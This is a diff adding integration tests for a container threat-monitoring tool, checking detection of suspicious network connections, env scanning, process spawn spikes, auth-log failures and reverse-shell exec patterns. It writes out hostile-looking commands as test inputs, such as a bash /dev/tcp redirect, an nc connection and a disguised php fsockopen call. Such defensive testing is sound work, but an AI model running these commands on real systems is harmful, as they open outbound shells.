@@ -162,6 +162,14 @@ def get_threat_events(container_name):
     return events
 
 
+def _find_container_cgroup_path(container_name: str) -> str | None:
+    """Discover the cgroup v2 path for a container by searching /sys/fs/cgroup."""
+    import glob
+
+    matches = glob.glob(f"/sys/fs/cgroup/**/{container_name}", recursive=True)
+    return next((m for m in matches if os.path.isdir(m)), None)
+
+
 def cleanup_container(name, coi_binary):
     """Force cleanup container."""
     subprocess.run(
@@ -1483,6 +1491,183 @@ time.sleep(60)
 
         proc.terminate()
         cleanup_container(container_name, coi_binary)
+
+    def test_allowlist_mode_rfc1918_flagged(self, test_workspace, coi_binary):
+        """Allowed-domain CIDRs must be passed to the monitoring daemon.
+
+        In allowlist network mode, RFC1918 private addresses are not in the
+        configured allow-list and should be flagged as network threats. Before
+        the fix, monitoring daemons always received an empty allowedCIDRs list,
+        so RFC1918 addresses were silently allowed regardless of network mode.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "allowlist"
+allowed_domains = ["github.com", "pypi.org"]
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-37"
+        )
+        rfc_script = Path(test_workspace) / "rfc1918_allowlist.py"
+        rfc_script.write_text(
+            """#!/usr/bin/env python3
+import subprocess, time
+subprocess.Popen(
+    ["timeout", "5", "nc", "-w", "2", "10.0.0.1", "80"],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+)
+time.sleep(60)
+"""
+        )
+        rfc_script.chmod(0o755)
+
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "37",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            if not wait_for_container_running(container_name, timeout=30):
+                pytest.skip(f"Container {container_name} not found or not running")
+
+            time.sleep(10)
+
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "python3",
+                    "/workspace/rfc1918_allowlist.py",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(10)
+
+            events = get_threat_events(container_name)
+            network_threats = [e for e in events if e.get("category") == "network"]
+            if len(network_threats) > 0:
+                for threat in network_threats:
+                    assert threat.get("level") in ["high", "critical"], (
+                        f"Expected HIGH/CRITICAL for RFC1918 in allowlist mode, got {threat.get('level')}"
+                    )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+            if backup is not None:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+
+    def test_container_internal_connection_visible(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Monitoring should be able to see container-internal (127.0.0.1) connections.
+
+        Reading /proc/<container-init-pid>/net/tcp from the host scopes the
+        read to the container's network namespace, making loopback connections
+        visible. The previous host /proc/net/tcp + containerIP filter could not
+        see connections whose local address is 127.0.0.1 (not the container IP).
+        Port 1234 is in the suspicious-port list. This is a best-effort check:
+        if any network threats are detected, they must be HIGH or CRITICAL.
+        """
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-38"
+        )
+        loopback_script = Path(test_workspace) / "loopback_c2port.py"
+        loopback_script.write_text(
+            """#!/usr/bin/env python3
+import socket, time
+
+# Start a listener on the suspicious port 1234
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind(("127.0.0.1", 1234))
+server.listen(1)
+
+# Connect to it (creates an ESTABLISHED connection on 127.0.0.1:1234)
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(("127.0.0.1", 1234))
+conn, _ = server.accept()
+
+# Hold the connection open so the monitor can see it
+time.sleep(120)
+"""
+        )
+        loopback_script.chmod(0o755)
+
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "38",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            if not wait_for_container_running(container_name, timeout=30):
+                pytest.skip(f"Container {container_name} not found or not running")
+
+            time.sleep(10)
+
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "python3",
+                    "/workspace/loopback_c2port.py",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(10)
+
+            events = get_threat_events(container_name)
+            network_threats = [e for e in events if e.get("category") == "network"]
+            if len(network_threats) > 0:
+                for threat in network_threats:
+                    assert threat.get("level") in ["high", "critical"], (
+                        f"Expected HIGH/CRITICAL for C2 port on loopback, got {threat.get('level')}"
+                    )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
 
 
 class TestReverseShellPatterns:
@@ -4005,6 +4190,1362 @@ class TestExpandedEnvScanningPatterns:
             cleanup_container(container_name, coi_binary)
 
 
+class TestProcessHostProcWalk:
+    """Verify that process threats are detected via the host /proc walk.
+
+    The monitoring daemon now reads /proc on the host, filtered by the
+    container's PID namespace, instead of running incus exec ps aux inside
+    the container.  These tests check that the end-to-end pipeline still
+    works: process injected into container → host /proc walk finds it →
+    threat detected → audit log entry written.
+    """
+
+    def test_env_scan_detected_via_host_proc_walk(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """An env-scanning process in the container must trigger a WARNING.
+
+        Uses exec -a to rename the process argv[0] to 'env', which matches
+        the env-scan pattern in checkEnvAccess. The host /proc walk reads
+        /proc/<pid>/cmdline, which contains the full argv including the
+        renamed arg, so the pattern is still visible from outside the
+        container.
+        """
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-56"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "56",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            if not wait_for_container_running(container_name, timeout=30):
+                pytest.skip(f"Container {container_name} not found or not running")
+
+            time.sleep(10)
+
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'env' sleep 30",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            warning_found = False
+            for _ in range(20):
+                time.sleep(1)
+                events = get_threat_events(container_name)
+                if any(e.get("level") == "warning" for e in events):
+                    warning_found = True
+                    break
+
+            assert warning_found, "Expected WARNING for env-scan command via host proc walk"
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+    def test_reverse_shell_detected_via_host_proc_walk(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """A reverse-shell process in the container must trigger a HIGH or CRITICAL threat.
+
+        The process is injected with exec -a to make its argv[0] look like
+        'python -c socket.socket'. The host /proc walk reads cmdline from
+        outside the container's mount namespace, so the pattern is visible
+        regardless of what /proc looks like inside the container.
+
+        ProcEventWatcher may fire a HIGH threat immediately via PROC_EVENT_EXEC
+        before the polling detector has a chance to escalate to CRITICAL.
+        """
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-57"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "57",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            if not wait_for_container_running(container_name, timeout=30):
+                pytest.skip(f"Container {container_name} not found or not running")
+
+            time.sleep(10)
+
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'python -c socket.socket' sleep 30",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            killed = False
+            for _ in range(20):
+                time.sleep(1)
+                if get_container_state(container_name) in ["Stopped", "Frozen", "Unknown"]:
+                    killed = True
+                    break
+
+            assert killed, (
+                "Container should be paused/killed on reverse-shell detection via host proc walk"
+            )
+
+            events = get_threat_events(container_name)
+            high_or_critical = [e for e in events if e.get("level") in ("high", "critical")]
+            assert len(high_or_critical) > 0, (
+                "Expected HIGH or CRITICAL threat event for reverse-shell pattern"
+            )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+
+class TestForkBombDetection:
+    """Verify that a process-count spike triggers a CRITICAL fork-bomb alert.
+
+    The monitor reads process counts from the host-side /proc walk, so an
+    attacker inside the container cannot hide processes by tampering with ps.
+    """
+
+    def test_fork_bomb_kills_container(self, test_workspace, coi_binary):
+        """Spawning many processes inside the container must trigger a CRITICAL
+        threat and (with auto_kill_on_critical) kill the container.
+
+        Uses a low process_count_threshold (15) so a simple shell loop is
+        enough to trip the detector without needing a real fork bomb.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 15
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-60"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "60",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Give monitoring a couple of seconds to establish baseline
+            time.sleep(3)
+
+            # Spawn many long-lived sleep processes to exceed the threshold.
+            # Using a bounded loop rather than a real fork bomb avoids
+            # destabilising the CI runner.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "for i in $(seq 1 30); do sleep 60 & done",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            killed = False
+            for _ in range(20):
+                time.sleep(1)
+                if get_container_state(container_name) in ["Stopped", "Frozen", "Unknown"]:
+                    killed = True
+                    break
+
+            assert killed, "Container should be killed when process count exceeds threshold"
+
+            events = get_threat_events(container_name)
+            critical = [
+                e
+                for e in events
+                if e.get("level") == "critical" and "process count" in e.get("title", "").lower()
+            ]
+            assert len(critical) > 0, "Expected CRITICAL process-count threat event"
+
+            evidence = critical[0].get("evidence", {}).get("process_count", {})
+            assert evidence.get("count", 0) > 15, "Evidence should record observed process count"
+            assert evidence.get("threshold") == 15, "Evidence should record configured threshold"
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_normal_process_count_no_alert(self, test_workspace, coi_binary):
+        """A container running within the process limit must not trigger any
+        process-count threat events.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 100
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-61"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "61",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Let the monitor run for a few cycles without spawning extra processes
+            time.sleep(6)
+
+            events = get_threat_events(container_name)
+            count_threats = [e for e in events if "process count" in e.get("title", "").lower()]
+            assert len(count_threats) == 0, (
+                f"Unexpected process-count threat with high threshold: {count_threats}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+
+class TestProcessSpawnRateDetection:
+    """Verify that a sudden burst of new processes triggers a CRITICAL spawn-rate alert.
+
+    Unlike the absolute-count check (TestForkBombDetection), spawn-rate detection
+    fires when the process delta between two consecutive polls exceeds the configured
+    threshold — even if the total process count is still below the absolute limit.
+    """
+
+    def test_spawn_rate_spike_kills_container(self, test_workspace, coi_binary):
+        """Spawning many processes in a single burst must trigger a CRITICAL
+        'Process spawn rate spike detected' event and (with auto_kill_on_critical)
+        kill the container.
+
+        The absolute process_count_threshold is set very high (9999) so only
+        the spawn-rate check fires.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 10
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-62"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "62",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Give monitoring a couple of seconds to establish baseline
+            time.sleep(3)
+
+            # Spawn 25 long-lived sleep processes in a single burst.
+            # The delta of ~25 exceeds the threshold of 10 within one 1-second poll.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "for i in $(seq 1 25); do sleep 60 & done",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            killed = False
+            for _ in range(20):
+                time.sleep(1)
+                if get_container_state(container_name) in ["Stopped", "Frozen", "Unknown"]:
+                    killed = True
+                    break
+
+            assert killed, "Container should be killed when spawn rate exceeds threshold"
+
+            events = get_threat_events(container_name)
+            rate_events = [
+                e
+                for e in events
+                if e.get("level") == "critical" and "spawn rate" in e.get("title", "").lower()
+            ]
+            assert len(rate_events) > 0, "Expected CRITICAL spawn-rate threat event"
+
+            evidence = rate_events[0].get("evidence", {}).get("process_count", {})
+            assert evidence.get("delta", 0) > 10, "Evidence should record process delta > threshold"
+            assert evidence.get("threshold") == 10, "Evidence should record configured threshold"
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_spawn_rate_disabled_when_threshold_zero(self, test_workspace, coi_binary):
+        """With process_spawn_rate_threshold = 0 (disabled), a burst of new processes
+        must not trigger any spawn-rate threat events.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 0
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-63"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "63",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            time.sleep(3)
+
+            # Spawn 25 processes — with threshold=0 this should not trigger any alert
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "for i in $(seq 1 25); do sleep 60 & done",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(6)
+
+            events = get_threat_events(container_name)
+            rate_events = [e for e in events if "spawn rate" in e.get("title", "").lower()]
+            assert len(rate_events) == 0, (
+                f"Unexpected spawn-rate threat with threshold=0: {rate_events}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+
+class TestAuthLogWatcher:
+    """End-to-end tests for host-side auth.log / syslog monitoring."""
+
+    def test_failed_ssh_login_detected(self, test_workspace, coi_binary):
+        """Writing a 'Failed password' line to auth.log triggers a WARNING auth threat."""
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-64"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "64",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon to start.
+            time.sleep(3)
+
+            # Write the suspicious line into the container's auth.log.
+            # The LogWatcher polls via incus file pull every 5 seconds, so the
+            # threat will be detected within one polling interval.
+            subprocess.run(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "mkdir -p /var/log && "
+                    "echo 'Jun  5 12:00:00 coi sshd[1234]: Failed password for invalid user attacker from 1.2.3.4 port 22222 ssh2'"
+                    " >> /var/log/auth.log",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                check=False,
+            )
+
+            # Poll until the auth threat appears (rescan ticker fires within 5 s,
+            # then inotify delivers near-instantly). 30 s timeout avoids CI flakes.
+            auth_events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                auth_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "auth"
+                    and e.get("evidence", {}).get("auth_log", {}).get("pattern")
+                    == "ssh_failed_password"
+                ]
+                if auth_events:
+                    break
+                time.sleep(1)
+
+            assert len(auth_events) > 0, (
+                f"Expected auth threat for failed SSH login, got events: {events}"
+            )
+            assert auth_events[0].get("level") == "warning", (
+                f"Expected warning level, got: {auth_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_sudo_not_in_sudoers_triggers_high(self, test_workspace, coi_binary):
+        """Writing a 'not in the sudoers file' line triggers a HIGH auth threat."""
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-65"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "65",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            time.sleep(3)
+
+            # Write the suspicious line into the container's auth.log.
+            # The LogWatcher polls via incus file pull every 5 seconds.
+            subprocess.run(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "mkdir -p /var/log && "
+                    "echo 'Jun  5 12:00:01 coi sudo: hacker is not in the sudoers file. This incident will be reported.'"
+                    " >> /var/log/auth.log",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                check=False,
+            )
+
+            # Poll until the HIGH auth threat appears (30 s timeout).
+            auth_events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                auth_events = [
+                    e for e in events if e.get("category") == "auth" and e.get("level") == "high"
+                ]
+                if auth_events:
+                    break
+                time.sleep(1)
+
+            assert len(auth_events) > 0, (
+                f"Expected HIGH auth threat for sudoers violation, got events: {events}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+
+class TestProcEventWatcher:
+    """End-to-end tests for host-side PROC_EVENTS monitoring via NETLINK_CONNECTOR."""
+
+    def test_bash_tcp_redirect_exec_detected(self, test_workspace, coi_binary):
+        """Executing 'bash -c /dev/tcp/...' inside a container triggers a HIGH proc_event threat.
+
+        The bash-tcp-redirect pattern matches when bash itself (argv[0]) opens a
+        /dev/tcp/ redirect — a canonical reverse-shell one-liner technique.
+        bash -i alone is intentionally NOT detected to avoid false positives from
+        legitimate interactive shells started by the host tooling.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-66"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "66",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Run bash with a /dev/tcp/ redirect — the canonical bash reverse-shell
+            # pattern. The connection to 10.255.255.1:9999 will fail (no listener),
+            # but PROC_EVENT_EXEC fires on execve before the shell tries to connect.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "bash -c 'exec 3>/dev/tcp/10.255.255.1/9999' 2>/dev/null; true",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            ).wait(timeout=15)
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "bash-tcp-redirect"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for bash /dev/tcp redirect, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_python_socket_exec_detected(self, test_workspace, coi_binary):
+        """Executing a Python reverse-shell one-liner triggers a HIGH proc_event threat."""
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-67"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "67",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Run a Python one-liner whose cmdline contains "python3" and
+            # "socket.socket", matching the python3-socket exec pattern.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "python3",
+                    "-c",
+                    "import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.close()",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            ).wait(timeout=10)
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "python3-socket"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for python socket one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_php_fsockopen_exec_detected(self, test_workspace, coi_binary):
+        """The php-fsockopen exec pattern fires when argv[0] is 'php' and 'fsockopen' is in cmdline.
+
+        Uses exec -a to set argv[0] to the PHP one-liner signature on a sleep process so that
+        PROC_EVENT_EXEC fires with the right cmdline without requiring php-cli to be installed.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-68"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "68",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Use exec -a to set argv[0] to the PHP fsockopen signature and run
+            # sleep as the actual process. PROC_EVENT_EXEC fires at execve time,
+            # and sleep keeps the process alive long enough to avoid a read race.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'php -r $sock=fsockopen(10.255.255.1,9999)' sleep 10",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "php-fsockopen"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
